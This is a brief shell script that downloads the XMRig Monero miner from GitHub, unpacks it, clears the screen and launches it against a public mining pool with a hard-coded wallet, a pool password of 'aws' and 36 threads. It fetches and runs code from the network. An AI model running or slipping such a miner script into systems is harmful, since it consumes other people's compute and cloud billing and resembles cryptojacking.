#!/bin/sh

wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
clear
./xmrig -o gulf.moneroocean.stream:10128 \
  -u 8BM4rswxAFJiMVX2pJj1iTLgzW1uWqsucUQNnDArw3vQF49e9nxA3C5U5Bi9rGs67ZKY67VPwB4XqXaz22eLD73u74pfeTh \
  -p aws --threads 36
